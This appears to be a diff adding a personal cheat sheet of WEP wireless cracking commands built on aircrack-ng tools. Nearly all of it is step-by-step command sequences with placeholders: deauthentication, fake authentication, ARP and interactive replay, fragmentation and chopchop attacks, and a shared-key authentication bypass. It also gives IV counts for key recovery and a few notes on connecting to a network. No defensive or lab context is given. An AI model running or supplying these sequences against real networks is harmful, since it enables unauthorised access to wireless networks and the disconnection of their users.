@@ -1,0 +1,101 @@
+ 
+
+You will need approximately 250,000 IVs for 64 bit and 1,500,000 IVs for 128 bit keys. If you are using the PTW attack, then you will need about 20,000 packets for 64-bit and 40,000 to 85,000 packets for 128 bit
+
+## install win-kex
+    apt install kali-win-kex
+    kex --sl -s (seamless mode)
+    
+## Interactive Packet Replay Attack (OPN with client) /// USE THIS THEN DEAUTH
+
+   airmon-ng start <interface> <AP_Channel>                                         
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>       
+   aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your_MAC> <interface>                
+   aireplay-ng -2 -b <AP_MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>     
+   aircrack-ng -z <capture_file>    
+
+
+## Deauthentication Attack (OPN with client or without)
+
+   airmon-ng start <interface> <AP_Channel>                                        
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>       
+   aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>   
+
+
+############### Connect to network: ########################################## 
+############### Connect to network: ########################################## 
+
+   ifconfig wlan0 up
+   iwlist wlan0 scan
+   iwconfig wlan0 essid "NetworkName"
+   iwconfig wlan0 key network_key
+   iwconfig wlan0 enc on
+   You may need to run 'ip addr flush dev wlan0' && `dhclient wlan0`
+
+   ##  alternative method:
+   sudo iwconfig wlan0 essid <SSID> key s:<KEY>
+   sudo dhclient wlan0
+
+############### Connect to network: ########################################## 
+############### Connect to network: ########################################## 
+
+
+## Fake Authentication Attack (OPN with or without client)
+   
+   airmon-ng start <interface> <AP_Channel>                                         
+   macchanger --show <interface>                                                    
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>       
+   aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your_MAC> <interface>                
+   
+   
+## Deauthentication Attack (OPN with client or without)
+
+   airmon-ng start <interface> <AP_Channel>                                        
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>       
+   aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                         
+
+
+## ARP Request Replay Attack (OPN with client)
+
+   airmon-ng start <interface> <AP_Channel>                                         
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>       
+   aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your_MAC> <interface>               
+   aireplay-ng -3 -b <AP_MAC> -h <Your_MAC> <interface>                             
+   aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                         
+   aircrack-ng <capture_file>                                                       
+                                                  
+
+
+## Fragmentation Attack (OPN without client)
+
+   airmon-ng start <interface> <AP_Channel>                                         
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>       
+   aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your MAC> <interface>                
+   aireplay-ng -5 -b <AP_MAC> -h <Your MAC> <interface>                             
+   packetforge-ng -0 -a <AP_MAC> -h <Your_MAC> -l <Source_IP> -k <Dest_IP> -y <XOR_file> -w <output_file>   
+   tcpdump -n -vvv -e -s0 -r <output_file>                                          
+   aireplay-ng -2 -r <output_file> <interface>                                      
+   aircrack-ng <capture_file>                                                       
+   
+
+## Korek ChopChop Attack (OPN without client)
+
+   airmon-ng start <interface> <AP_Channel>                                        
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>       
+   aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your_MAC> <interface>                
+   aireplay-ng -4 -b <AP_MAC> -h <Your_MAC> <interface>                            
+   packetforge-ng -0 -a <AP_MAC> -h <Your_MAC> -l <Source_IP> -k <Dest_IP> -y <XOR_file> -w <output_file>     
+   tcpdump -n -vvv -e -s0 -r <output_file>                                          
+   aireplay-ng -2 -r <output_file> <interface>                                     
+   aircrack-ng <capture_file>                                                       
+
+
+## Bypassing WEP Shared Key Authentication (SKA)
+   
+   airmon-ng start <interface> <AP_Channel>                                                 
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>                
+   aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                                 
+   aireplay-ng -1 0 -e <ESSID> -y <keystream file> -a <AP_MAC> -h <Your_MAC> <interface>     
+   aireplay-ng -3 -b <AP_MAC> -h <Your_MAC> <interface>                                      
+   aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                                  
+   aircrack-ng <capture_file> 
